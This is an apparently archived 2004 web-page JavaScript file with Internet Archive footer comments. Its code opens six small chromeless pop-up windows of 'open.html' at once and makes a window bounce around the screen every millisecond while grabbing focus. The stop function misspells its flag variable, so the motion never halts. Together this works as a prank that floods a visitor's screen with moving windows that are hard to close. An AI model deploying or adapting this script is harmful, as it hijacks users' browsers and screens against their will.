

		var xOff = 5;
		var yOff = 5;
		var xPos = 400;
		var yPos = -100;
		var flagRun = 1;

function openWindow(url){
        aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=180,height=175,titlebar=no,alwaysRaised=yes');
}

function procreate(){
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		}

function newXlt(){
        xOff = Math.ceil( 0 - 6 * Math.random()) * 5 - 10 ;
        window.focus()}

function newXrt(){
        xOff = Math.ceil(7 * Math.random())  * 5 - 10 ;
        }

function newYup(){
        yOff = Math.ceil( 0 - 6 * Math.random())  * 5 - 10 ;
        }

function newYdn(){
        yOff = Math.ceil( 7 * Math.random())  * 5 - 10  ;
        }
function fOff(){
        flagrun = 0;
        }

function playBall(){
        xPos += xOff;
        yPos += yOff;
        if (xPos > screen.width-175){
        newXlt();
        }
        if (xPos < 0){
        newXrt();
        }
        if (yPos > screen.height-100){
        newYup();
        }
        if (yPos < 0){
        newYdn();
        }
        if (flagRun == 1){
        window.moveTo(xPos,yPos);
        setTimeout('playBall()',1);
        }
        }

/*
     FILE ARCHIVED ON 05:15:49 Oct 19, 2004 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 17:34:23 May 19, 2020.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
*/
/*
playback timings (ms):
  captures_list: 621.515
  LoadShardBlock: 593.366 (3)
  esindex: 0.018
  PetaboxLoader3.datanode: 108.407 (4)
  RedisCDXSource: 7.612
  PetaboxLoader3.resolve: 539.386 (2)
  exclusion.robots: 0.182
  CDXLines.iter: 16.312 (3)
  exclusion.robots.policy: 0.167
  load_resource: 79.872
*/